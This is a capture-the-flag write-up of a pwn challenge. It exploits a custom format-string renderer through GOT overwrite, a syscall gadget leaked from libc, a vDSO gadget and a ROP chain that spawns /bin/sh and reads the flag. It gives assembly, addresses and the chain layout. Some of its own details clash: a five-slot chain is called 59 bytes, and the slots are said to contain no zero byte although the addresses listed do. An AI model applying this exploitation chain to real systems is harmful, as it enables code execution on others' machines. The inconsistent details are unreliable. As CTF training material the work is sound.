# Print Print Revolution - Pwn (Hard)

**Flag:** `sun{cust0m_fmtstr_n0_t00ls_4ll0wed}` · Files: `revolution`, 14520 bytes, sha256 `918483831ef0b27d0cfb8afa9e0341f38d0a296931ccc5f73ef80f5d610f8fa5` · Service: `nc chal.sunshinectf.games 26002`

## Challenge

The dot-matrix printer of an arcade machine spits out strange tickets. The task: step up to the
renderer and see what it actually prints. There is only one stripped ELF and one TCP port.

The flag string summarizes the challenge constraint: a hand-written format string, no tools
allowed. This requires building an exploit without pwntools, ROPgadget, WSL, or an attached libc file, meaning all necessary structures must be extracted manually from the remote service.

## Analysis

64-bit ELF, `ET_EXEC` (no PIE, base `0x400000`), stripped, `.text` only 0x4ea bytes.
Exactly five imported functions: `write strlen strcspn read setvbuf`. No `open`/`fopen`,
meaning the binary cannot read files by itself. Reaching `/ctf/flag.txt` requires executing a command (execve).

The main loop is at `0x4010d0`:
```asm
lea    rbx, [rsp]           ; buf = rsp of main, 512 bytes
sub    rsp, 0x200
loop:  write(1,"score> ",7)
       read(0, rbx, 0x1ff)  ; rax = number of bytes read
       mov  rsi, rbp        ; "\n"
       mov  rdi, rbx
       mov  [rsp+rax], 0
       call strcspn@plt     ; -> rax = độ dài dòng
       xor  eax, eax
       call 0x401330        ; RENDERER(rdi = buf)
       write(1,"\n",1)
       jmp  loop
```

`0x401330` is not libc's printf. It builds a fake `va_list` right on the stack:
```asm
mov [rsp+0x38], rsi ; [rsp+0x40], rdx ; [rsp+0x48], rcx ; [rsp+0x50], r8 ; [rsp+0x58], r9
mov [rsp+0x18], 8   ; gp_offset     mov [rsp+0x1c], 0x30 ; fp_offset
lea rax,[rsp+0x120]; mov [rsp+0x20], rax ; overflow_arg_area = rsp+0x120
lea rax,[rsp+0x30];  mov [rsp+0x28], rax ; reg_save_area     = rsp+0x30
```

`rsp+0x120` of the renderer is exactly `buf` (the renderer sits from main exactly
6 `push`es + 8 bytes of return + `sub 0xe8` = 0x128 bytes away). So the 6th parameter onwards is
read straight from the input.

## Solution

**Step 1 - Reading the renderer's grammar.** The comparison branch at `0x4013e8..0x401524` reveals
four specifiers:

| Specifier | Behavior | Primitive |
|---|---|---|
| `%%` | prints `%` | - |
| `%<n>$s` | `write(1, (char*)arg[n], strlen(arg[n]))` | arbitrary read |
| `%<n>$p` / `%<n>$x` | prints `0x%016lx` of `arg[n]` | arbitrary leak |
| `%<n>$w` | `*arg[n] = arg[n+1]`, prints `ok` | arbitrary 8-byte write |

with `arg[6+k] = buf[8k]`. The `va_arg` function at `0x4012c0` loads `ap`
with `movdqu` (a copy) and only increments the offsets inside that copy, never writing them back
to memory. It is stateless. `%8$w` takes the pair (arg8, arg9) rather than (arg8, arg17)
as real `printf` would.

Locating `buf`: `arg70 = buf[0x200]` is exactly where `rbx` gets spilled, so `%70$p` yields the
buffer address. `arg119` is the `AT_SYSINFO_EHDR` entry in `auxv`, yielding the vDSO address.

**Step 2 - The GOT is writable despite "RELRO".** `PT_GNU_RELRO` covers `[0x403dc0, 0x404000)`,
but the PLT slots sit starting at `0x404000`:
```
write=0x404000 strlen=0x404008 strcspn=0x404010 read=0x404018 setvbuf=0x404020
```
and `.plt.sec` jumps through exactly those slots (`jmp [rip+0x2f66]` → `0x404010`). The values
are still lazy stubs (`0x401030`...), so BIND_NOW is not enabled. The GOT is writable memory.

**Step 3 - A `syscall` gadget without a libc file.** Read `write@GOT` to obtain the real address of
`write` in the running libc. Read the bytes of its first 0x40 one at a time (each `%<n>$s`
returns up to the next 0 byte) to discover `0f 05` at `write+0x12`.

**Step 4 - Gadgets that set the arguments.** The binary lacks `pop rsi/rdx/rax; ret`. However, `vdso+0xa14` contains a sequence of zeroing instructions:
```
xor edx,edx ; xor ecx,ecx ; xor esi,esi ; xor edi,edi ;
xor r8d,r8d ; xor r9d,r9d ; xor r10d,r10d ; xor r11d,r11d ; ret
```
This zeroes out `rdx` and `rsi` but omits `xor eax,eax`, preserving `rax`.

**Step 5 - Syscall number.** At `call strcspn@plt` (`0x40112a`), `rax` equals the number of bytes `read()` just returned. Therefore, the payload length becomes the syscall number. Sending exactly 59 bytes sets `rax` to 59 (`execve`).

**Step 6 - The ROP chain.** Write `strcspn@GOT := pop rdi; ret` (`0x4014a1`, sitting inside the
5-byte nop right before `pop r15; ret`) so that the chain starts at `buf[0]`:
```
buf[0x00] = vdso+0xa14     ; rsi = rdx = 0, rax remains 59
buf[0x08] = 0x4014a1       ; pop rdi; ret
buf[0x10] = buf+0x100      ; &"/bin/sh"
buf[0x18] = write+0x12     ; syscall  ->  execve("/bin/sh", NULL, NULL)
buf[0x20] = 0x40114f       ; only used if execve fails
```
The chain is exactly 59 bytes. The `/bin/sh` string is planted at `buf+0x100` with
`%<n>$w` from an earlier submission. The whole
chain contains no `%` character at all and the first 0 byte lies after all five slots, meaning the
renderer has nothing to analyze: the syscall happens right at `call strcspn`.

**Step 7 - Verifying correctness.** To verify the chain, a control variant was run
replacing the `buf[0x18]` slot with `0x40114f` (no syscall). The
control returns a normal `score> `, proving the chain executes properly. Restoring the syscall causes the shell to launch silently and wait for input, allowing standard commands.

## Result
```bash
python exploit.py
```

```
[*] buf=0x7fffd0f0b0a8  vdso=0x7ae9f6832000  write=0x7ae9f6732560  syscall=0x7ae9f6732572
[*] ghi GOT + duong dan: 2 x 'ok'
[>] cat /ctf/flag.txt -> sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
[+] CO: sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
```
